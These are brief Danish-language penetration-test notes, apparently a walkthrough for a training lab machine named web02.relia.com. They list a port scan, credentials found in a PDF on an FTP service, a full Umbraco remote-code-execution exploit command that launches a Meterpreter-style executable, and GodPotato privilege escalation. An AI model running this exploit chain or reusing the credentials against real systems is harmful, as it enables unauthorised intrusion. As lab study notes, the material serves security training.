nmap scan med -p-
find filezilla på port 14020
connect, find pdf, åben og find creds (mark:OathDeeplyReprieve91)

find exploit mod umbraco:
python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell.exe -a '-noprofile -command C:\\windows\\temp\\met.exe'

i dokument står der også at man skal bruge FQDN (web02.relia.com) så det sættes i /etc/hosts.

brug godpotato til privesc